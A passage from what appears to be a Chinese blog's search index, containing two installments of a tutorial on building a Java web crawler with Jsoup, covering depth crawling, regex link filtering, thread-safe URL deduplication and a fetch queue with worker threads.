pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/04/17/Java-借助ImageMagic实现图片编辑服务/"},{"title":"Java 动手写爬虫: 二、 深度爬取","text":"第二篇:深度爬取 前面实现了一个最基础的爬取单网页的爬虫，这一篇则着手解决深度爬取的问题 简单来讲，就是爬了一个网页之后，继续爬这个网页中的链接 I. 需求背景背景比较简单和明确，当爬了一个网页之后，目标是不要就此打住，扫描这个网页中的链接，继续爬，所以有几个点需要考虑: 哪些链接可以继续爬 ？ 是否要一直爬下去，要不要给一个终止符？ 新的链接中，提取内容的规则和当前网页的规则不一致可以怎么办？ II. 设计针对上面的几点，结合之前的实现结构，在执行 doFetchPage 方法获取网页之后，还得做一些其他的操作 扫描网页中的链接，根据过滤规则匹配满足要求的链接 记录一个depth，用于表示爬取的深度，即从最原始的网页出发，到当前页面中间转了几次（讲到这里就有个循环爬取的问题，后面说） 不同的页面提取内容规则不一样，因此可以考虑留一个接口出来，让适用方自己来实现解析网页内容 1. 基本实现 开始依然是先把功能点实现，然后再考虑具体的优化细节 先加一个配置项，表示爬取页面深度; 其次就是保存的结果，得有个容器来暂存， 所以在 SimpleCrawlJob 会新增两个属性 12345678910/** * 批量查询的结果 */private List&lt;CrawlResult&gt; crawlResults = new ArrayList&lt;&gt;();/** * 爬网页的深度, 默认为0， 即只爬取当前网页 */private int depth = 0; 因为有深度爬取的过程，所以需要修改一下爬取网页的代码，新增一个 doFetchNetxtPage方法，进行迭代爬取网页，这时，结果匹配处理方法也不能如之前的直接赋值了，稍微改一下即可, 改成返回一个接过实例 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657/** * 执行抓取网页 */public void doFetchPage() throws Exception { doFetchNextPage(0, this.crawlMeta.getUrl()); this.crawlResult = this.crawlResults.get(0);}private void doFetchNextPage(int currentDepth, String url) throws Exception { HttpResponse response = HttpUtils.request(new CrawlMeta(url, this.crawlMeta.getSelectorRules()), httpConf); String res = EntityUtils.toString(response.getEntity()); CrawlResult result; if (response.getStatusLine().getStatusCode() != 200) { // 请求成功 result = new CrawlResult(); result.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); result.setUrl(crawlMeta.getUrl()); this.crawlResults.add(result); return; } result = doParse(res); // 超过最大深度， 不继续爬 if (currentDepth &gt; depth) { return; } Elements elements = result.getHtmlDoc().select(\"a[href]\"); for(Element element: elements) { doFetchNextPage(currentDepth + 1, element.attr(\"href\")); }}private CrawlResult doParse(String html) { Document doc = Jsoup.parse(html); Map&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(crawlMeta.getSelectorRules().size()); for (String rule : crawlMeta.getSelectorRules()) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (Element element : doc.select(rule)) { list.add(element.text()); } map.put(rule, list); } CrawlResult result = new CrawlResult(); result.setHtmlDoc(doc); result.setUrl(crawlMeta.getUrl()); result.setResult(map); result.setStatus(CrawlResult.SUCCESS); return result;} 说明主要的关键代码在 doFetchNextPage 中，这里有两个参数，第一个表示当前url属于爬取的第几层，爬完之后，判断是否超过最大深度，如果没有，则获取出网页中的所有链接，迭代调用一遍 下面主要是获取网页中的跳转链接，直接从jsoup的源码中的example中获取，获取网页中链接的方法 123456// 未超过最大深度， 继续爬网页中的所有链接result = doParse(res);Elements elements = result.getHtmlDoc().select(\"a[href]\");for(Element element: elements) { doFetchNextPage(currentDepth + 1, element.attr(\"href\"));} 测试case测试代码和之前的差不多，唯一的区别就是指定了爬取的深度，返回结果就不截图了，实在是有点多 123456789101112131415161718192021/** * 深度爬 * @throws InterruptedException */@Testpublic void testDepthFetch() throws InterruptedException { String url = \"https://my.oschina.net/u/566591/blog/1031575\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); SimpleCrawlJob job = new SimpleCrawlJob(1); job.setCrawlMeta(crawlMeta); Thread thread = new Thread(job, \"crawlerDepth-test\"); thread.start(); thread.join(); List&lt;CrawlResult&gt; result = job.getCrawlResults(); System.out.println(result);} III. 改进1. 问题上面虽然是实现了目标，但问题却有点多： 就比如上面的测试case，发现有122个跳转链接，顺序爬速度有点慢 链接中存在重复、页面内锚点、js等各种情况，并不是都满足需求 最后的结果塞到List中，深度较多时，链接较多时，list可能被撑暴 2. 添加链接的过滤 过滤规则，可以划分为两种，正向的匹配，和逆向的排除 首先是修改配置类 CrawlMeta， 新增两个配置 1234567891011121314151617181920212223242526/** * 正向的过滤规则 */@Setter@Getterprivate Set&lt;Pattern&gt; positiveRegex = new HashSet&lt;&gt;();/** * 逆向的过滤规则 */@Setter@Getterprivate Set&lt;Pattern&gt; negativeRegex = new HashSet&lt;&gt;();public Set&lt;Pattern&gt; addPositiveRegex(String regex) { this.positiveRegex.add(Pattern.compile(regex)); return this.positiveRegex;}public Set&lt;Pattern&gt; addNegativeRegex(String regex) { this.negativeRegex.add(Pattern.compile(regex)); return this.negativeRegex;} 然后在遍历子链接时，判断一下是否满足需求 12345678910111213141516171819202122232425262728293031323334// doFetchNextPage 方法Elements elements = result.getHtmlDoc().select(\"a[href]\");String src;for(Element element: elements) { src = element.attr(\"href\"); if (matchRegex(src)) { doFetchNextPage(currentDepth + 1, element.attr(\"href\")); }}// 规则匹配方法private boolean matchRegex(String url) { Matcher matcher; for(Pattern pattern: crawlMeta.getPositiveRegex()) { matcher = pattern.matcher(url); if (matcher.find()) { return true; } } for(Pattern pattern: crawlMeta.getNegativeRegex()) { matcher = pattern.matcher(url); if(matcher.find()) { return false; } } return crawlMeta.getPositiveRegex().size() == 0;} 上面主要是通过正则来进行过滤，暂不考虑正则带来的开销问题，至少是解决了一个过滤的问题 但是，但是，如果网页中的链接是相对路径的话，会怎么样 直接使用 Jsoup来测试一个网页，看获取的link地址为什么 123456789101112131415// 获取网页中的所有链接@Testpublic void testGetLink() throws IOException { String url = \"http://chengyu.911cha.com/zishu_3_p1.html\"; Connection httpConnection = HttpConnection.connect(url) .header(\"accept\", \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\") .header(\"connection\", \"Keep-Alive\") .header(\"user-agent\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\"); Document doc = httpConnection.get(); Elements links = doc.select(\"a[href]\"); print(\"\\nLinks: (%d)\", links.size());} 看下取出的链接 根据上面的测试，获取的链接如果是相对地址，则会有问题，需要有一个转化的过程，这个改动比较简单，jsoup本身是支持的 改一行即可 1234567// 解析为documnet对象时，指定 baseUrl// 上面的代码结构会做一点修改，后面会说到Document doc = Jsoup.parse(html, url);// 获取链接时，前面添加abssrc = element.attr(\"abs:href\"); 3. 保存结果当爬取的数据量较多时，将结果都保存在内存中，并不是一个好的选择，假色每个网页中，满足规则的是有10个，那么depth=n， 则从第一个网页出发，最终会得到 1 + 10 + ... + 10^n = (10^(n+1) - 1) / 9 显然在实际情况中是不可取的，因此可以改造一下，获取数据后给一个回调，让用户自己来选择如何处理结果，这时 SimpleCrawelJob 的结构基本上满足不了需求了 重新开始设计 1. AbstractJob 类中定义一个回调方法123456/** * 解析完网页后的回调方法 * * @param crawlResult */protected abstract void visit(CrawlResult crawlResult); 2. DefaultAbstractCrawlJob 实现爬取网页逻辑的抽象类这个类实现爬取网页的主要逻辑，也就是将之前的SimpleCrwalJob的实现拷贝过来，区别是干掉了返回结果; 顺带修了一个小bug 😢 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121/** * Created by yihui on 2017/6/29. */@Getter@Setter@NoArgsConstructorpublic abstract class DefaultAbstractCrawlJob extends AbstractJob { /** * 配置项信息 */ private CrawlMeta crawlMeta; /** * http配置信息 */ private CrawlHttpConf httpConf = new CrawlHttpConf(); /** * 爬网页的深度, 默认为0， 即只爬取当前网页 */ protected int depth = 0; public DefaultAbstractCrawlJob(int depth) { this.depth = depth; } /** * 执行抓取网页 */ public void doFetchPage() throws Exception { doFetchNextPage(0, this.crawlMeta.getUrl()); } private void doFetchNextPage(int currentDepth, String url) throws Exception { CrawlMeta subMeta = new CrawlMeta(url, this.crawlMeta.getSelectorRules(), this.crawlMeta.getPositiveRegex(), this.crawlMeta.getNegativeRegex()); HttpResponse response = HttpUtils.request(subMeta, httpConf); String res = EntityUtils.toString(response.getEntity()); CrawlResult result; if (response.getStatusLine().getStatusCode() != 200) { // 请求成功 result = new CrawlResult(); result.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); result.setUrl(crawlMeta.getUrl()); this.visit(result); return; } // 网页解析 result = doParse(res, subMeta); // 回调用户的网页内容解析方法 this.visit(result); // 超过最大深度， 不继续爬 if (currentDepth &gt; depth) { return; } Elements elements = result.getHtmlDoc().select(\"a[href]\"); String src; for(Element element: elements) { // 确保将相对地址转为绝对地址 src = element.attr(\"abs:href\"); if (matchRegex(src)) { doFetchNextPage(currentDepth + 1, src); } } } private CrawlResult doParse(String html, CrawlMeta meta) { // 指定baseUrl， 否则利用 abs:href 获取链接会出错 Document doc = Jsoup.parse(html, meta.getUrl()); Map&lt;String, List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(meta.getSelectorRules().size()); for (String rule : crawlMeta.getSelectorRules()) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (Element element : doc.select(rule)) { list.add(element.text()); } map.put(rule, list); } CrawlResult result = new CrawlResult(); result.setHtmlDoc(doc); result.setUrl(meta.getUrl()); result.setResult(map); result.setStatus(CrawlResult.SUCCESS); return result; } private boolean matchRegex(String url) { Matcher matcher; for(Pattern pattern: crawlMeta.getPositiveRegex()) { matcher = pattern.matcher(url); if (matcher.find()) { return true; } } for(Pattern pattern: crawlMeta.getNegativeRegex()) { matcher = pattern.matcher(url); if(matcher.find()) { return false; } } return crawlMeta.getPositiveRegex().size() == 0; }} 3. SimpleCrawlJob重写这个简单爬虫任务的实现，因为主要逻辑在 DefaultAbstractCrawlJob中已经实现了，所以直接继承过来即可 主要关注的就是 visit 方法，这里就是爬取网页之后的回调，这个最简单的爬虫任务，就是将结果保存在内存中 123456789101112131415161718192021222324252627282930313233343536373839404142/** * 最简单的一个爬虫任务 * &lt;p&gt; * Created by yihui on 2017/6/27. */@Getter@Setter@NoArgsConstructorpublic class SimpleCrawlJob extends DefaultAbstractCrawlJob { /** * 存储爬取的结果 */ private CrawlResult crawlResult; /** * 批量查询的结果 */ private List&lt;CrawlResult&gt; crawlResults = new ArrayList&lt;&gt;(); public SimpleCrawlJob(int depth) { super(depth); } @Override protected void visit(CrawlResult crawlResult) { crawlResults.add(crawlResult); } public CrawlResult getCrawlResult() { if(crawlResults.size() == 0) { return null; } return crawlResults.get(0); }} 4，使用测试和之前没有任何区别，先来个简单的 123456789101112131415161718@Testpublic void testDepthFetch() throws InterruptedException { String url = \"http://chengyu.911cha.com/zishu_3_p1.html\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.911cha.com/zishu_3_p([0-9]+).html\"); SimpleCrawlJob job = new SimpleCrawlJob(1); job.setCrawlMeta(crawlMeta); Thread thread = new Thread(job, \"crawlerDepth-test\"); thread.start(); thread.join(); List&lt;CrawlResult&gt; result = job.getCrawlResults(); System.out.println(result);} 运行截图 直接使用 DefaultAbstractCrawl 抽象类的回调来进行测试 123456789101112131415161718192021@Testpublic void testSelfCwralFetch() throws InterruptedException { String url = \"http://chengyu.911cha.com/zishu_3_p1.html\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.911cha.com/zishu_3_p([0-9]+).html\"); DefaultAbstractCrawlJob job = new DefaultAbstractCrawlJob(1) { @Override protected void visit(CrawlResult crawlResult) { System.out.println(crawlResult.getUrl()); } }; job.setCrawlMeta(crawlMeta); Thread thread = new Thread(job, \"crawlerDepth-test\"); thread.start(); thread.join(); System.out.println(\"over\");} 4. 爬虫去重 从上面可以发现，重复爬取是比较浪费的事情，因此去重是非常有必要的；一般想法是将爬过的url都标记一下，每次爬之前判断是否已经爬过了 依然先是采用最low的方法，搞一个Set来记录所有爬取的url，因为具体的爬虫任务设计的是多线程的，所以这个Set是要求多线程共享的 此外考虑到去重的手段比较多，我们目前虽然只是采用的内存中加一个缓存表，但不妨碍我们设计的时候，采用面向接口的方式 1. IStorage 接口 提供存记录，判断记录是否存在的方法 12345678910111213141516171819public interface IStorage { /** * 若爬取的URL不在storage中， 则写入； 否则忽略 * * @param url 爬取的网址 * @return true 表示写入成功， 即之前没有这条记录； false 则表示之前已经有记录了 */ boolean putIfNotExist(String url, CrawlResult result); /** * 判断是否存在 * @param url * @return */ boolean contains(String url);} 2. RamStorage 利用Map实现的内存存储1234567891011121314151617181920public class RamStorage implements IStorage { private Map&lt;String, CrawlResult&gt; map = new ConcurrentHashMap&lt;&gt;(); @Override public boolean putIfNotExist(String url, CrawlResult result) { if(map.containsKey(url)) { return false; } map.put(url, result); return true; } @Override public boolean contains(String url) { return map.containsKey(url); }} 3. StorageWrapper 封装类 这个封装类要求多线程共享，所以我们采用单例模式，保证只有一个实例 一个最原始的实现方式如下(暂不考虑其中比较猥琐的storage实例化方式) 12345678910111213141516171819202122232425262728293031323334353637public class StorageWrapper { private static StorageWrapper instance = new StorageWrapper(); private IStorage storage; public static StorageWrapper getInstance() { return instance; } private StorageWrapper() { storage = new RamStorage(); } /** * 判断url是否被爬取过 * * @param url * @return */ public boolean ifUrlFetched(String url) { return storage.contains(url); } /** * 爬完之后， 新增一条爬取记录 * @param url * @param crawlResult */ public void addFetchRecord(String url, CrawlResult crawlResult) { storage.putIfNotExist(url, crawlResult); }} 这样一个简单的保存爬取历史记录的容器就有了，那么在爬取时，就需要事前判断一下 对应的 DefaultAbstractCrawlJob#doFetchNextPage 方法更新如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344// fixme 非线程安全private void doFetchNextPage(int currentDepth, String url) throws Exception { if (StorageWrapper.getInstance().ifUrlFetched(url)) { return; } CrawlMeta subMeta = new CrawlMeta(url, this.crawlMeta.getSelectorRules(), this.crawlMeta.getPositiveRegex(), this.crawlMeta.getNegativeRegex()); HttpResponse response = HttpUtils.request(subMeta, httpConf); String res = EntityUtils.toString(response.getEntity()); CrawlResult result; if (response.getStatusLine().getStatusCode() != HttpStatus.SC_OK) { // 请求成功 result = new CrawlResult(); result.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); result.setUrl(crawlMeta.getUrl()); this.visit(result); return; } // 网页解析 result = doParse(res, subMeta); StorageWrapper.getInstance().addFetchRecord(url, result); // 回调用户的网页内容解析方法 this.visit(result); // 超过最大深度， 不继续爬 if (currentDepth &gt; depth) { return; } Elements elements = result.getHtmlDoc().select(\"a[href]\"); String src; for(Element element: elements) { // 确保将相对地址转为绝对地址 src = element.attr(\"abs:href\"); if (matchRegex(src)) { doFetchNextPage(currentDepth + 1, src); } }} 如果仔细看上面的方法，就会发现在多线程环境下，依然可能存在重复爬取的情况 如有两个CrawlJob任务，若爬取的是同一个url，第一个任务爬取完，还没有回写到Storage时，第二个任务开始爬，这时，事前判断没有记录，然后通过之后开始爬，这时就依然会出现重复爬的问题 要解决这个问题，一个简单的方法就是加锁，在判断一个url没有被爬时，到回写一条爬取结果这段期间，加一个保护锁 StorageWrapper 更新后如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778/** * Created by yihui on 2017/6/29. */public class StorageWrapper { private static StorageWrapper instance = new StorageWrapper(); private IStorage storage; private Map&lt;String, Lock&gt; lockMap = new ConcurrentHashMap&lt;&gt;(); public static StorageWrapper getInstance() { return instance; } private StorageWrapper() { storage = new RamStorage(); } /** * 判断url是否被爬取过; 是则返回true； 否这返回false， 并上锁 * * @param url * @return */ public boolean ifUrlFetched(String url) { if(storage.contains(url)) { return true; } synchronized (this) { if (!lockMap.containsKey(url)) { // 不存在时，加一个锁 lockMap.put(url, new ReentrantLock()); } this.lock(url); if (storage.contains(url)) { return true; }// System.out.println(Thread.currentThread() + \" lock url: \" + url); return false; } } /** * 爬完之后， 新增一条爬取记录 * @param url * @param crawlResult */ public void addFetchRecord(String url, CrawlResult crawlResult) { try { if (crawlResult != null) { storage.putIfNotExist(url, crawlResult); this.unlock(url); } } catch (Exception e) { System.out.println(Thread.currentThread().getName() + \" result: \" + url + \" e: \" + e); } } private void lock(String url) { lockMap.get(url).lock(); } private void unlock(String url) { lockMap.get(url).unlock(); }} 使用处，稍稍变动如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private void doFetchNextPage(int currentDepth, String url) throws Exception { CrawlResult result = null; try { // 判断是否爬过；未爬取，则上锁并继续爬取网页 if (StorageWrapper.getInstance().ifUrlFetched(url)) { return; } CrawlMeta subMeta = new CrawlMeta(url, this.crawlMeta.getSelectorRules(), this.crawlMeta.getPositiveRegex(), this.crawlMeta.getNegativeRegex()); HttpResponse response = HttpUtils.request(subMeta, httpConf); String res = EntityUtils.toString(response.getEntity()); if (response.getStatusLine().getStatusCode() != HttpStatus.SC_OK) { // 请求成功 result = new CrawlResult(); result.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); result.setUrl(crawlMeta.getUrl()); this.visit(result); return; } // 网页解析 result = doParse(res, subMeta); } finally { // 添加一条记录， 并释放锁 StorageWrapper.getInstance().addFetchRecord(url, result); } // 回调用户的网页内容解析方法 this.visit(result); // 超过最大深度， 不继续爬 if (currentDepth &gt; depth) { return; } Elements elements = result.getHtmlDoc().select(\"a[href]\"); String src; for(Element element: elements) { // 确保将相对地址转为绝对地址 src = element.attr(\"abs:href\"); if (matchRegex(src)) { doFetchNextPage(currentDepth + 1, src); } }} 4. 测试1234567891011121314151617181920212223242526272829303132333435363738394041@Testpublic void testSelfCwralFetch() throws InterruptedException { String url = \"http://chengyu.t086.com/gushi/1.htm\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.t086.com/gushi/[0-9]+\\\\.htm$\"); DefaultAbstractCrawlJob job = new DefaultAbstractCrawlJob(1) { @Override protected void visit(CrawlResult crawlResult) { System.out.println(\"job1 &gt;&gt;&gt; \" + crawlResult.getUrl()); } }; job.setCrawlMeta(crawlMeta); String url2 = \"http://chengyu.t086.com/gushi/2.htm\"; CrawlMeta crawlMeta2 = new CrawlMeta(); crawlMeta2.setUrl(url2); crawlMeta2.addPositiveRegex(\"http://chengyu.t086.com/gushi/[0-9]+\\\\.htm$\"); DefaultAbstractCrawlJob job2 = new DefaultAbstractCrawlJob(1) { @Override protected void visit(CrawlResult crawlResult) { System.out.println(\"job2 &gt;&gt;&gt; \" + crawlResult.getUrl()); } }; job2.setCrawlMeta(crawlMeta2); Thread thread = new Thread(job, \"crawlerDepth-test\"); Thread thread2 = new Thread(job2, \"crawlerDepth-test2\"); thread.start(); thread2.start(); thread.join(); thread2.join();} 输出如下 1234567job2 &gt;&gt;&gt; http://chengyu.t086.com/gushi/2.htmjob1 &gt;&gt;&gt; http://chengyu.t086.com/gushi/1.htmjob1 &gt;&gt;&gt; http://chengyu.t086.com/gushi/3.htmjob2 &gt;&gt;&gt; http://chengyu.t086.com/gushi/4.htmjob1 &gt;&gt;&gt; http://chengyu.t086.com/gushi/5.htmjob1 &gt;&gt;&gt; http://chengyu.t086.com/gushi/6.htmjob1 &gt;&gt;&gt; http://chengyu.t086.com/gushi/7.htm IV. 小结这一篇的博文有点多，到这里其实上面一些提出的问题还没有解决，留待下一篇博文来fix掉, 下面则主要说明下本篇的要点 深度爬取 这里使用了迭代的思路，爬到一个网页之后，判断是否需要停止，不停止，则把该网页中的链接捞出来，继续爬；关键点 利用 Jsoup 获取网页中所有链接（注意相对路径转绝对路径的用法） 循环迭代 过滤 过滤，主要利用正则来匹配链接；这里需要注意一下几点 正向过滤 负向过滤 去重 如何保证一个链接被爬了之后，不会被重复进行爬取？ 记录爬取历史 注意多线程安全问题 加锁（一把锁会导致性能降低，这里采用了一个url对应一个锁，注意看实现细节，较多的坑） 遗留问题 失败重试 爬网页中链接不应该串行进行 频率控制（太快可能会被反扒干掉） 源码地址： https://github.com/liuyueyi/quick-crawler/releases/tag/v0.003 对应tag ：v0.003 相关博文Quick-Crawel爬虫系列博文 V. 其他一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2017/06/30/Java-动手写爬虫-二、-深度爬取/"},{"title":"Java 动手写爬虫: 三、爬取队列","text":"第三篇 爬取队列的实现 第二篇中，实现了深度爬取的过程，但其中一个比较明显的问题就是没有实现每个爬取作为一个独立的任务来执行；即串行的爬取网页中的链接；因此，这一篇将主要集中目标在并发的爬网页的问题上 目标是每个链接的爬取都当做一个独立的job来执行 设计分工说明 每个job都是独立的爬取任务，且只爬取对应的网址 一个阻塞队列，用于保存所有需要爬取的网址 一个控制器，从队列中获取待爬取的链接，然后新建一个任务执行 图解说明 Fetcher: 从队列中获取 CrawlMeta, 然后创建一个Job任务开始执行 Job: 根据 CrawlMeta 爬取对应的网页，爬完之后将结果塞入 ResultSelector ResultSelector : 分析爬取的结果，将所有满足条件的链接抽出来，封装对应的 CrawlMeta塞入队列 然后上面组成一个循环，即可实现自动的深度爬取 1. CrawlMeta meta对象，保存的是待爬取的url和对应的选择规则，链接过滤规则，现在则需要加一个当前深度的参数，表名当前爬取的url是第几层, 用于控制是否需要停止继续纵向的爬取 123456/** * 当前爬取的深度 */@Getter@Setterprivate int currentDepth = 0; 2. FetchQueue 这个就是保存的待爬取网页的队列，其中包含两个数据结果 toFetchQueue: CrawlMeta 队列，其中的都是需要爬取的url urls: 所有爬取过or待爬取的url集合，用于去重 源码如下，需要注意一下几个点 tag: 之所以留了这个，主要是考虑我们的系统中是否可以存在多个爬取队列，如果存在时，则可以用tag来表示这个队列的用途 addSeed 方法，内部先判断是否已经进入过队列了，若爬取了则不丢入待爬取队列（这个去重方式可以与上一篇实现的去重方式进行对比）；获取队列中的第一个元素时，是没有加锁的，ArrayBlockingQueue 内部保障了线程安全 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263/** * 待爬的网页队列 * &lt;p&gt; * Created by yihui on 2017/7/6. */public class FetchQueue { public static FetchQueue DEFAULT_INSTANCE = newInstance(\"default\"); /** * 表示爬取队列的标识 */ private String tag; /** * 待爬取的网页队列 */ private Queue&lt;CrawlMeta&gt; toFetchQueue = new ArrayBlockingQueue&lt;&gt;(200); /** * 所有爬取过的url集合， 用于去重 */ private Set&lt;String&gt; urls = ConcurrentHashMap.newKeySet(); private FetchQueue(String tag) { this.tag = tag; } public static FetchQueue newInstance(String tag) { return new FetchQueue(tag); } /** * 当没有爬取过时， 才丢入队列； 主要是避免重复爬取的问题 * * @param crawlMeta */ public void addSeed(CrawlMeta crawlMeta) { if (urls.contains(crawlMeta.getUrl())) { return; } synchronized (this) { if (urls.contains(crawlMeta.getUrl())) { return; } urls.add(crawlMeta.getUrl()); toFetchQueue.add(crawlMeta); } } public CrawlMeta pollSeed() { return toFetchQueue.poll(); }} 3. DefaultAbstractCrawlJob 默认的抽象爬取任务，第二篇深度爬取中是直接在这个job中执行了所有的深度爬取，这里我们需要抽里出来，改成每个job只爬取这个网页，至于网页内部的链接，则解析封装后丢入队列即可，不执行具体的抓去网页工作 需要先增加两个成员变量 12345678910/** * 待爬取的任务队列 */private FetchQueue fetchQueue;/** * 解析的结果 */private CrawlResult crawlResult; 然后执行爬取的逻辑修改一下，主要的逻辑基本上没有变化，只是将之前的迭代调用，改成塞入队列，改动如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * 执行抓取网页 */void doFetchPage() throws Exception { HttpResponse response = HttpUtils.request(this.crawlMeta, httpConf); String res = EntityUtils.toString(response.getEntity(), httpConf.getCode()); if (response.getStatusLine().getStatusCode() != HttpStatus.SC_OK) { // 请求成功 this.crawlResult = new CrawlResult(); this.crawlResult.setStatus(response.getStatusLine().getStatusCode(), response.getStatusLine().getReasonPhrase()); this.crawlResult.setUrl(crawlMeta.getUrl()); this.visit(this.crawlResult); return; } // 网页解析 this.crawlResult = doParse(res, this.crawlMeta); // 回调用户的网页内容解析方法 this.visit(this.crawlResult); // 解析返回的网页中的链接，将满足条件的扔到爬取队列中 int currentDepth = this.crawlMeta.getCurrentDepth(); if (currentDepth &gt; depth) { return; } Elements elements = crawlResult.getHtmlDoc().select(\"a[href]\"); String src; for (Element element : elements) { // 确保将相对地址转为绝对地址 src = element.attr(\"abs:href\"); if (!matchRegex(src)) { continue; } CrawlMeta meta = new CrawlMeta(currentDepth + 1, src, this.crawlMeta.getSelectorRules(), this.crawlMeta.getPositiveRegex(), this.crawlMeta.getNegativeRegex()); fetchQueue.addSeed(meta); }} String res = EntityUtils.toString(response.getEntity(), httpConf.getCode()); 上面的代码，与之前有一行需要注意下, 这里对结果进行解析时，之前没有考虑字符编码的问题，因此全部走的都是默认编码逻辑，对应的源码如下，其中 defaultCharset = null, 因此最终的编码可能是 ISO_8859_1 也可能是解析的编码方式，所以在不指定编码格式时，可能出现乱码问题 123456789101112131415161718Charset charset = null;try { ContentType contentType = ContentType.get(entity); if(contentType != null) { charset = contentType.getCharset(); }} catch (UnsupportedCharsetException var13) { throw new UnsupportedEncodingException(var13.getMessage());}if(charset == null) { charset = defaultCharset;}if(charset == null) { charset = HTTP.DEF_CONTENT_CHARSET;} 为了解决乱码问题，在 HttpConf (与网络相关的配置项）中新添加了一个code参数，表示对应的编码，因为目前我们的教程还没有到网络相关的模块，所以先采用了最简单的实现方式，在DefaultAbstractCrawlJob 中加了一个方法（后面的测试会给出对应的使用姿势） 123protected void setResponseCode(String code) { httpConf.setCode(code);} 4. Fetcher 这个就是我们新增的爬取控制类，在这里实现从队列中获取任务，然后创建job来执行 因为职责比较清晰，所以一个最简单的实现如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950public class Fetcher { private int maxDepth; private FetchQueue fetchQueue; public FetchQueue addFeed(CrawlMeta feed) { fetchQueue.addSeed(feed); return fetchQueue; } public Fetcher() { this(0); } public Fetcher(int maxDepth) { this.maxDepth = maxDepth; fetchQueue = FetchQueue.DEFAULT_INSTANCE; } public &lt;T extends DefaultAbstractCrawlJob&gt; void start(Class&lt;T&gt; clz) throws Exception { CrawlMeta crawlMeta; int i = 0; while (true) { crawlMeta = fetchQueue.pollSeed(); if (crawlMeta == null) { Thread.sleep(200); if (++i &gt; 300) { // 连续一分钟内没有数据时，退出 break; } continue; } i = 0; DefaultAbstractCrawlJob job = clz.newInstance(); job.setDepth(this.maxDepth); job.setCrawlMeta(crawlMeta); job.setFetchQueue(fetchQueue); new Thread(job, \"crawl-thread-\" + System.currentTimeMillis()).start(); } }} 5. 测试测试代码与之前就有些区别了，比之前要简洁一些 123456789101112131415161718192021222324252627282930public class QueueCrawlerTest { public static class QueueCrawlerJob extends DefaultAbstractCrawlJob { public void beforeRun() { // 设置返回的网页编码 super.setResponseCode(\"gbk\"); } @Override protected void visit(CrawlResult crawlResult) { System.out.println(Thread.currentThread().getName() + \" ___ \" + crawlResult.getUrl()); } } public static void main(String[] rags) throws Exception { Fetcher fetcher = new Fetcher(1); String url = \"http://chengyu.t086.com/gushi/1.htm\"; CrawlMeta crawlMeta = new CrawlMeta(); crawlMeta.setUrl(url); crawlMeta.addPositiveRegex(\"http://chengyu.t086.com/gushi/[0-9]+\\\\.htm$\"); fetcher.addFeed(crawlMeta); fetcher.start(QueueCrawlerJob.class); }} 输出结果如下 1234567crawl-thread-1499333696153 ___ http://chengyu.t086.com/gushi/1.htmcrawl-thread-1499333710801 ___ http://chengyu.t086.com/gushi/3.htmcrawl-thread-1499333711142 ___ http://chengyu.t086.com/gushi/7.htmcrawl-thread-1499333710801 ___ http://chengyu.t086.com/gushi/2.htmcrawl-thread-1499333710802 ___ http://chengyu.t086.com/gushi/6.htmcrawl-thread-1499333710801 ___ http://chengyu.t086.com/gushi/4.htmcrawl-thread-1499333710802 ___ http://chengyu.t086.com/gushi/5.htm 改进 和之前一样，接下来就是对上面的实现进行缺点分析和改进 1. 待改善点 Fetcher 中，每个任务都起一个线程，可以用线程池来优化管理 Job 中执行任务和结果分析没有拆分，离我们的job只做爬取的逻辑有一点差距 退出程序的逻辑比较猥琐 爬取网页的间隔时间可以加一下 频繁的Job对象创建与销毁，是否可以考虑对象池的方式减少gc 2. 线程池直接使用Java的线程池来操作，因为线程池有较多的配置参数，所以先定义一个配置类; 给了一个默认的配置项，这个可能并不满足实际的业务场景，参数配置需要和实际的爬取任务相关联，才可以达到最佳的使用体验 1234567891011121314151617// Fetcher.java @Getter @Setter @ToString @NoArgsConstructor public static class ThreadConf { private int coreNum = 6; private int maxNum = 10; private int queueSize = 10; private int aliveTime = 1; private TimeUnit timeUnit = TimeUnit.MINUTES; private String threadName = \"crawl-fetch\"; public final static ThreadConf DEFAULT_CONF = new ThreadConf(); } 线程池初始化 123456789101112131415161718private Executor executor;@Setterprivate ThreadConf threadConf;/** * 初始化线程池 */private void initExecutor() { 